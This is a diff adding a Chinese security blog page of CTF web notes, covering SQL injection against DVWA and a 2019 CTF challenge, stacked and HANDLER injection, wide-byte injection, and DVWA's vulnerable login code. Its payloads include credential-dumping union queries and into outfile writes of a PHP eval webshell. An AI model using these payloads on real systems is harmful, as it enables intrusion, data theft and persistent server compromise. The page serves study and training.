@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Fuzz是安全测试的一种方法，也是极为重要的一种手段！当你面对waf无所适从的时候，这时候你就可以Fuzz模糊测试来绕过waf，甚至你可以发现一些意想不到的姿势！ valid 有效的、invalid 无效的  Catalog渗透中POC、EXP、Payload与Shellcode的区别想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB_本职工作(持续更新)">
+<meta property="og:url" content="http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="Fuzz是安全测试的一种方法，也是极为重要的一种手段！当你面对waf无所适从的时候，这时候你就可以Fuzz模糊测试来绕过waf，甚至你可以发现一些意想不到的姿势！ valid 有效的、invalid 无效的  Catalog渗透中POC、EXP、Payload与Shellcode的区别想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-02-14T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-16T16:24:16.989Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>WEB_本职工作(持续更新)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/02/14/PHP%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&text=WEB_本职工作(持续更新)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&is_video=false&description=WEB_本职工作(持续更新)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WEB_本职工作(持续更新)&body=Check out this article: http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&name=WEB_本职工作(持续更新)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&t=WEB_本职工作(持续更新)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Catalog"><span class="toc-number">1.</span> <span class="toc-text">Catalog</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E4%B8%ADPOC%E3%80%81EXP%E3%80%81Payload%E4%B8%8EShellcode%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.0.0.0.0.1.</span> <span class="toc-text">渗透中POC、EXP、Payload与Shellcode的区别</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection"><span class="toc-number">1.1.</span> <span class="toc-text">SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%91%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">👋手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0-%E4%BF%AE%E6%94%B9%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%EF%BC%88-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E6%96%B9%E6%B3%95%E4%B9%8B%E4%B8%80%EF%BC%89"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">堆叠+修改表的结构进行注入（[强网杯 2019]随便注方法之一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HANDLER%E8%AF%AD%E5%8F%A5%E6%B3%A8%E5%85%A5%EF%BC%88-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E6%96%B9%E6%B3%95%E4%B9%8B%E4%B8%80%EF%BC%89"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">HANDLER语句注入（[强网杯 2019]随便注方法之一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%9Ahttps-www-jianshu-com-p-4fe931da9550"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">宽字节注入：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4fe931da9550</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Site-Request-Forgery-CSRF"><span class="toc-number">1.4.</span> <span class="toc-text">Cross Site Request Forgery (CSRF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.5.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vim%E7%BC%93%E5%AD%98%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">Vim缓存导致的网页源码泄漏</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WEB_本职工作(持续更新)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Eli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-02-14T00:00:00.000Z" itemprop="datePublished">2020-02-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>Fuzz是安全测试的一种方法，也是极为重要的一种手段！当你面对waf无所适从的时候，这时候你就可以Fuzz模糊测试来绕过waf，甚至你可以发现一些意想不到的姿势！</p>
+<p>valid 有效的、invalid 无效的</p>
+</blockquote>
+<h1 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h1><h6 id="渗透中POC、EXP、Payload与Shellcode的区别"><a href="#渗透中POC、EXP、Payload与Shellcode的区别" class="headerlink" title="渗透中POC、EXP、Payload与Shellcode的区别"></a>渗透中POC、EXP、Payload与Shellcode的区别</h6><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个POC。之后你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个EXP，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧。</p>
+<p>几点注意</p>
+<blockquote>
+<p>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。<br>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。<br>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。<br>Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。</p>
+</blockquote>
+<p>Payload模块</p>
+<blockquote>
+<p>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p>
+</blockquote>
+<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><h4 id="👋手工注入"><a href="#👋手工注入" class="headerlink" title="👋手工注入"></a>👋手工注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">&gt;</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> gordonb <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1337</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pablo   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smithy  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> admin   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> gordonb <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1337</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pablo   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smithy  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> admin   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> gordonb <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1337</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pablo   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smithy  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 判断是否为注入</span><br><span class="line">?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;2</span><br><span class="line"></span><br><span class="line"># 判断字段长度（2 正常，3 异常）</span><br><span class="line">?id&#x3D;1&#39; order by 2 -- </span><br><span class="line">?id&#x3D;1&#39; order by 3 --</span><br><span class="line"></span><br><span class="line"># 确定回显点</span><br><span class="line">?id&#x3D;1&#39; union select 111,222 -- </span><br><span class="line"></span><br><span class="line"># 用户名和数据库名称</span><br><span class="line">?id&#x3D;1&#39; union select user(),database() -- </span><br><span class="line">-- output：admin@localhost、dvwa</span><br><span class="line"></span><br><span class="line"># 查看当前用户和 mysql 版本</span><br><span class="line">?id&#x3D;1&#39; union select current_user(),version() -- </span><br><span class="line">-- output：First name: admin@%、 5.5.47-0ubuntu0.14.04.1</span><br><span class="line"></span><br><span class="line"># 爆表名</span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema &#x3D;database() -- </span><br><span class="line">-- output：guestbook,users</span><br><span class="line"></span><br><span class="line"># 爆列名（两种办法，加引号或者十六进制编码）</span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name &#x3D;0x7573657273 -- </span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name &#x3D;&#39;users&#39; -- </span><br><span class="line">-- output：user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line"># 爆字段名</span><br><span class="line">?id&#x3D;1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users  -- </span><br><span class="line">?id&#x3D;1&#39; union select null,concat_ws(char(32,58,32),user,password) from users -- </span><br><span class="line">?id&#x3D;1&#39; union select user,password from users -- </span><br><span class="line">-- output：admin&#x2F;5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">?id&#x3D;1&#39; union select 1,load_file(&#39;&#x2F;&#x2F;tmp&#x2F;&#x2F;key&#39;) -- </span><br><span class="line"></span><br><span class="line"># 写文件()</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;2&#39; union select null,&#39;hello&#39; into outfile &#39;&#x2F;tmp&#x2F;test01&#39; --</span><br><span class="line">?id&#x3D;999&#39; union select null,&#39;hello&#39; into outfile &#39;&#x2F;tmp&#x2F;test02&#39; --</span><br><span class="line">?id&#x3D;999&#39;  union select null,&#39;&lt;?php @eval($_POST[&quot;gg&quot;]); ?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;test03&#39; --  </span><br><span class="line">?id&#x3D;999&#39; union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile &#39;&#x2F;&#x2F;tmp&#x2F;&#x2F;test04&#39; -- </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="堆叠-修改表的结构进行注入（-强网杯-2019-随便注方法之一）"><a href="#堆叠-修改表的结构进行注入（-强网杯-2019-随便注方法之一）" class="headerlink" title="堆叠+修改表的结构进行注入（[强网杯 2019]随便注方法之一）"></a>堆叠+修改表的结构进行注入（[强网杯 2019]随便注方法之一）</h4><p>WAF:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use inject :union</span><br><span class="line">error:return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>存在堆叠注入<br>1’;show talbes;#</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tales:</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>1919810931114514</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#96;是 MySQL 的转义符，避免和 mysql 的本身的关键字冲突</span><br><span class="line">0&#39;;show columns from &#96;1919810931114514&#96;;#</span><br><span class="line">flag   varchar(100)</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">																					 ID列为无符号整型，该列值不可以为空，并不可以重复(primery key主键)，而且自增.alert table 表名 change 现有字段名称  修改后字段名称 数据类型</span><br><span class="line">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key;alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
+<p>alter 改变表<br>ALTER TABLE</p>
+<h4 id="HANDLER语句注入（-强网杯-2019-随便注方法之一）"><a href="#HANDLER语句注入（-强网杯-2019-随便注方法之一）" class="headerlink" title="HANDLER语句注入（[强网杯 2019]随便注方法之一）"></a>HANDLER语句注入（[强网杯 2019]随便注方法之一）</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/handler.html">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a> ，在这里就可以找到答案</p>
+</blockquote>
+<p>该HANDLER语句提供对表存储引擎接口的直接访问。可用于 InnoDB和MyISAM表。<br>该HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问。<br>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭。</p>
+<p>最后根据文档一把梭：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;#</span><br></pre></td></tr></table></figure>
+<p><code>handler yunensec read first; #读取指定表/句柄的首行数据</code><br><code>handler yunensec read next; #读取指定表/句柄的下一行数据</code></p>
+<h4 id="宽字节注入：https-www-jianshu-com-p-4fe931da9550"><a href="#宽字节注入：https-www-jianshu-com-p-4fe931da9550" class="headerlink" title="宽字节注入：https://www.jianshu.com/p/4fe931da9550"></a>宽字节注入：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4fe931da9550">https://www.jianshu.com/p/4fe931da9550</a></h4><blockquote>
+<p>宽字节注入是因为数据库使用了GBK编码，不过现在大都使用unicode国际编码，大多数网站都使用了utf-8的编码</p>
+</blockquote>
+<p>id=1’———-&gt;id=1&#39;———&gt;id=1%5c%27<br>id=1%df’———id=1%df%5c%27———-&gt;id=1%DF5C%27——–&gt;id=1運’</p>
+<p>其实就是利用gbk是多字节的编码，两个字节代表一个汉字</p>
+<p>%df %5c 组合出了一个“運”字</p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yufusec/p/9179625.html">BP 的 intruder</a></p>
+<p>BP 攻击类型：Sniper（狙击手）、Battering ram（攻城石）、Pitchfork（音叉）、Clusterbomb（集束炸弹）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string( $user );	&#x2F;&#x2F;	过滤掉一些 sql 注入字符</span><br><span class="line">stripslashes( $user );	&#x2F;&#x2F;	Returns a string with backslashes stripped off. (\&#39; becomes &#39; and so on.) Double backslashes (\\) are made into a single backslash (\).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;	常规连接数据库语句（有被注入（可通过 mysql_real_escape_string 或者 PDO（PHP Data Object）防止）和爆破（限制输错密码次数（使用 mysql update 实现））风险）</span><br><span class="line">$query  &#x3D; &quot;SELECT * FROM &#96;users&#96; WHERE user &#x3D; &#39;$user&#39; AND password &#x3D; &#39;$pass&#39;;&quot;;</span><br><span class="line">$result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line">if( $result &amp;&amp; mysql_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get users details</span><br><span class="line">        $avatar &#x3D; mysql_result( $result, 0, &quot;avatar&quot; );</span><br><span class="line">        &#x2F;&#x2F; Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Login failed</span><br><span class="line">        sleep( rand( 0, 3 ) );	&#x2F;&#x2F;	⚠️prevent time inject</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;	PDO（PHP Data Object）</span><br><span class="line">$sql&#x3D;&quot;insert login(username,password,upic,mail) values(:username,:password,:age,:mail)&quot;;</span><br><span class="line">$stmt&#x3D;$pdo-&gt;prepare($sql);</span><br><span class="line">&#x2F;&#x2F;	第三个参数可以指定参数的类型PDO::PARAM_STR为字符串，PDO::PARAM_INT为整型数</span><br><span class="line">$stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);</span><br><span class="line">$stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);</span><br><span class="line">$stmt-&gt;bindParam(&quot;:age&quot;,$age,PDO::PARAM_INT);</span><br><span class="line">&#x2F;&#x2F;	使用bindValue()方法绑定一个定值</span><br><span class="line">$stmt-&gt;bindValue(&quot;:mail&quot;,&#39;default@qq.com&#39;);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">echo 